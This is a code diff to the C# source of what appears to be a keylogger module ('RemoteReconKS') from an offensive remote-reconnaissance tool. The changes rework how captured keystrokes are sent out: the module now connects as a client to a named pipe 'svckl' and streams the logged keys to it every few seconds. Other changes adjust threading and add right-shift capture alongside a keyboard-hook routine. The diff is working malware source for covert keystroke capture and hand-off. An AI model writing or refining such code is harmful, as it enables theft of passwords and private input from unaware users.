@@ -71,7 +71,7 @@ namespace RemoteReconKS
             {
                 LogKeyStrokes();
             });
-            t.SetApartmentState(ApartmentState.STA);
+            t.SetApartmentState(ApartmentState.MTA);
             t.IsBackground = true;
             t.Start();
 #if DEBUG
@@ -95,36 +95,39 @@ namespace RemoteReconKS
         
         private static void LogKeyStrokes()
         {
-            NamedPipeServerStream server = new NamedPipeServerStream("svc_kl", PipeDirection.InOut, 1, PipeTransmissionMode.Byte);
-            server.WaitForConnection();
+            NamedPipeClientStream client = new NamedPipeClientStream(".","svckl", PipeDirection.InOut);
+            client.Connect(5000);
 #if DEBUG
-            File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", "Received connection from client");
+            File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", "Connected to server" + '\n');
 #endif
-            while (server.IsConnected)
+            sw = new StreamWriter(client);
+            while (client.IsConnected)
             {
-                if (keylogoutput.Length != 0)
+                try
                 {
-                    try
-                    {
-                        byte[] msg = Encoding.Unicode.GetBytes(keylogoutput.ToString());
-                        server.Write(msg, 0, msg.Length);
-                        keylogoutput.Remove(0, keylogoutput.Length);
-                    }
-                    catch (Exception e)
-                    {
 #if DEBUG
-                        File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", e.ToString());
+                    File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", keylogoutput.ToString());
 #endif
-                    }
+                    sw.WriteLine(keylogoutput.ToString());
+                    keylogoutput.Remove(0, keylogoutput.Length);
                 }
-
-                Thread.Sleep(5000);
+                catch (Exception e)
+                {
+#if DEBUG
+                    File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", e.ToString() + "\n");
+#endif
+                }
+                
+                
+                Thread.Sleep(3000);
+                sw.Flush();
             }
 #if DEBUG
-            File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", "Client disconnected");
+            File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", "\nClient disconnected\n");
 #endif
-            server.Close();
-            server.Dispose();
+            sw.Close();
+            client.Close();
+            client.Dispose();
         }
 
         private static IntPtr SetHook(WinApi.LowLevelKeyboardProc proc)
@@ -182,6 +185,7 @@ namespace RemoteReconKS
                     {
                         keyboardState[(int)Keys.ShiftKey] = 0x80;
                         keyboardState[(int)Keys.LShiftKey] = 0x80;
+                        keyboardState[(int)Keys.RShiftKey] = 0x80;
                     }
 
                     var s = new StringBuilder(256);
